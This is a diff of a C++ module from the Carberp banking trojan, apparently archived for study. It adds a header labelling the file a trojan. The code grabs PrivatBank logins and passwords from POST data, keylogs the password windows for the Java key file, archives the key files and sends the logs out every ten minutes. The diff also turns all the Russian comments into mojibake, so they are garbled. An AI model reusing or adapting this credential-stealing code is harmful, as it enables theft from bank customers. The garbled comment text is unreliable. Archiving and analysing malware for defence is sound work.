@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef PrivatBankH
 	#error Exclude module from project
 #endif
@@ -23,35 +34,35 @@ namespace PPRIVATDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define PRVDBG PPRIVATDEBUGSTRINGS::DBGOutMessage<>
 
 
-// Строки определены в модуле StrConsts.cpp
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ StrConsts.cpp
 
-extern CSSTR EStrPrivatBankGrabber[]; // Имя системы грабера приватбанка
-extern CSSTR EStrPrivatBankKeyPassWndMask[];  // Маска заголовка окна ввода проля
-extern CSSTR EStrPrivatBankKeyPassWndMask2[]; // Маска заголовка второго окна ввода проля
-extern CSSTR EStrPrivatBankLoginMask[]; // Маска определения адреса авторизации в приват24
-extern CSSTR EStrPrivatBankLogin[];    // логин
-extern CSSTR EStrPrivatBankPassword[]; // пароль
+extern CSSTR EStrPrivatBankGrabber[]; // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+extern CSSTR EStrPrivatBankKeyPassWndMask[];  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+extern CSSTR EStrPrivatBankKeyPassWndMask2[]; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+extern CSSTR EStrPrivatBankLoginMask[]; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ24
+extern CSSTR EStrPrivatBankLogin[];    // пїЅпїЅпїЅпїЅпїЅ
+extern CSSTR EStrPrivatBankPassword[]; // пїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 
 namespace  PrivatBank
 {
 
-	// Динамические данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD PID = 0;
-	string* LoginURLMask; // Маска определения адреса авторизации
+	string* LoginURLMask; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TPrivatBank *Grabber = NULL;
 	//------------------------------------------------
 
 
 
 	//------------------------------------------------
-	//  ShowWndHandler - обрабатываем событие закрытия
-	//                   окна
+	//  ShowWndHandler - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//                   пїЅпїЅпїЅпїЅ
 	//------------------------------------------------
    /*	void WINAPI ShowWndHandler(PKeyLogger, DWORD, LPVOID Data)
 	{
@@ -61,7 +72,7 @@ namespace  PrivatBank
 
 		if (SW->Command == SW_HIDE && SW->Window == Grabber->Wnd())
 		{
-			// При закрытии окна отправляем лог
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			Grabber->SendLog();
 			delete Grabber;
 			Grabber = NULL;
@@ -76,28 +87,28 @@ namespace  PrivatBank
 
 
 //------------------------------------------------
-//  Initialize - Функция инициализирует грабер
-//				 пароля ключа приватбанка
+//  Initialize - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//				 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 bool PrivatBank::Initialize(HWND Wnd, DWORD  WndClassHash)
 {
 	if (WndClassHash != JAVAWND_SUNAWTDIALOG)
 		return false;
 
-	// Определяем текст окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	string WndText = GetWndText2(Wnd);
 	int WndType = TPrivatBank::IsKeyPassWnd(WndText);
 	if (!WndType) return false;
 
 	if (IsNewProcess(PID))
 	{
-		// Инициализируем данны в новом процессе
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     	Grabber = NULL;
     }
 
 	if (!Grabber)
 	{
-		PRVDBG("PrivatKeyPass", "Грабер пароля ключа приватбанка инициализирован");
+		PRVDBG("PrivatKeyPass", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		Grabber = new TPrivatBank();
 		Grabber->ActivateKeyPassLogger(Wnd, WndText, WndType);
@@ -109,11 +120,11 @@ bool PrivatBank::Initialize(HWND Wnd, DWORD  WndClassHash)
 
 
 //------------------------------------------------
-//  CheckPostData - Функция проверяет пост данные
-//                  на предмет обнаружения логина
-//                  и пароля
+//  CheckPostData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//                  пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//                  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  Приват отправляет данные в виде
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 //  "UserName=login&UserPass=pass&......
 //------------------------------------------------
 void PrivatBank::CheckPostData(const char* URL, const char* PostData)
@@ -121,15 +132,15 @@ void PrivatBank::CheckPostData(const char* URL, const char* PostData)
 
 	if (IsNewProcess(PID))
 	{
-		// Инициализируем данны в новом процессе
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		LoginURLMask = new string(GetStr(EStrPrivatBankLoginMask));
 	}
 
-	//проверяем адрес
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!WildCmp(URL, LoginURLMask->t_str()))
 		return;
 
-	// Получаем логин и пароль
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	string Login    = GetStr(EStrPrivatBankLogin);
 	string Password = GetStr(EStrPrivatBankPassword);
 
@@ -137,14 +148,14 @@ void PrivatBank::CheckPostData(const char* URL, const char* PostData)
 				 (STRA::Pos(PostData, Password.t_str()) >= 0);
 	if (!Valid) return;
 
-	// Разбираем данные и извлекаем пароль
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TBotStrings Fields;
 	Fields.SetDelimetedText(PostData, "&");
 
 	string LoginValue      = Fields.GetValue(Login);
 	string PasswordValue   = Fields.GetValue(Password);
 
-	// Сохраняем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!LoginValue.IsEmpty() && !PasswordValue.IsEmpty())
 	{
 		TPrivatBank Grabber;
@@ -158,7 +169,7 @@ void PrivatBank::CheckPostData(const char* URL, const char* PostData)
 
 
 //*****************************************************
-// Грабер приватбанка
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //*****************************************************
 TPrivatBank::TPrivatBank()
 	: TGrabber(GetStr(EStrPrivatBankGrabber))
@@ -174,7 +185,7 @@ TPrivatBank::~TPrivatBank()
 
 
 //------------------------------------------------
-// Функция инициализирует файлы логов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 bool TPrivatBank::InitializeMainLog()
 {
@@ -187,18 +198,18 @@ bool TPrivatBank::InitializeMainLog()
 		{
 			FLog->SetSendAsCAB(true);
 //			FLog->SetSendInterval(300000);
-			FLog->SetSendInterval(600000);  // Задержка 10 минут
+			FLog->SetSendInterval(600000);  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 10 пїЅпїЅпїЅпїЅпїЅ
         }
 	}
 	return FLog->Active();
 }
 
 //------------------------------------------------
-// Функция добавляет в лог логин и пароль
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Password)
 {
-	// При авторизации, закрываем старый лог
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	if (FLog)
 	{
 		delete FLog;
@@ -216,7 +227,7 @@ void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Passwor
 }
 
 //------------------------------------------------
-//  Функция добавляет файл ключа в архив
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 void TPrivatBank::AddKeyFile(const string& FileName)
 {
@@ -228,7 +239,7 @@ void TPrivatBank::AddKeyFile(const string& FileName)
 
 
 //------------------------------------------------
-//  Функция активирует логер пароля ключа
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 void TPrivatBank::ActivateKeyPassLogger(HWND Wnd, const string& WndText, int WndType)
 {
@@ -236,40 +247,40 @@ void TPrivatBank::ActivateKeyPassLogger(HWND Wnd, const string& WndText, int Wnd
 
 	FKeyPassWnd = Wnd;
 
-	// Определяем имя поля
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	FKeyPassFieldName = GetStr(EStrLogFieldKeyPassword);
 	if (WndType == 2)
 		FKeyPassFieldName += "2";
 
-	// Получаем имя файла ключа из заголовка окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (WndType == 1) ParseKeyFileName(WndText);
 
-	// Активируем лог
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	InitializeMainLog();
 
-	// Подключаемся к кейлогеру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	ConnectToKeyLogger();
 }
 
 
 //------------------------------------------------
-// Функция проверяет заголовок окна и возвращает
-// не нулевое значение если окно является окном
-// ввода пароля улюча
-// Результат:
-//            1 - Окно ввода основного пароля
-//            2 - Окно ввода второго пароля
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:
+//            1 - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//            2 - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------
 int TPrivatBank::IsKeyPassWnd(const string& WndText)
 {
 	if (!WndText.IsEmpty())
     {
-		// Проверяем основной пароль
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		string Mask = GetStr(EStrPrivatBankKeyPassWndMask);
 		if (WildCmp(WndText.t_str(), Mask.t_str()))
 			return 1;
 
-		// Проверяем второй пароль
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Mask = GetStr(EStrPrivatBankKeyPassWndMask2);
 		if (WildCmp(WndText.t_str(), Mask.t_str()))
 			return 2;
@@ -278,8 +289,8 @@ int TPrivatBank::IsKeyPassWnd(const string& WndText)
 }
 
 //------------------------------------------
-//  Функция разбирает заколовок окна
-//  в поисках имени файла ключа
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------
 void TPrivatBank::ParseKeyFileName(const string& Text)
 {
@@ -296,7 +307,7 @@ void TPrivatBank::ParseKeyFileName(const string& Text)
 }
 
 //------------------------------------------
-//  Функция сохранет лог клавиатуры
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------
 void TPrivatBank::LogKeyboad(HWND aWnd, const char* Text)
 {
@@ -311,22 +322,22 @@ void TPrivatBank::LogKeyboad(HWND aWnd, const char* Text)
 
 
 //------------------------------------------
-// Функция обработки глоальных событий
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------
 void TPrivatBank::DoEvent(int EventId, LPVOID Param)
 {
-	// Обрабатываем  зкрытие окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (EventId != KLE_SHOW_WND) return;
 
 	PShowWindowData SW = (PShowWindowData)Param;
 
 	if (SW->Command == SW_HIDE && SW->Window == FKeyPassWnd)
 	{
-		// При закрытии окна закрываем лог
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		if (PrivatBank::Grabber == this)
 		{
 			PrivatBank::Grabber = NULL;
-			delete this;   // Самоуничтожаемся
+			delete this;   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         }
 	}
 }
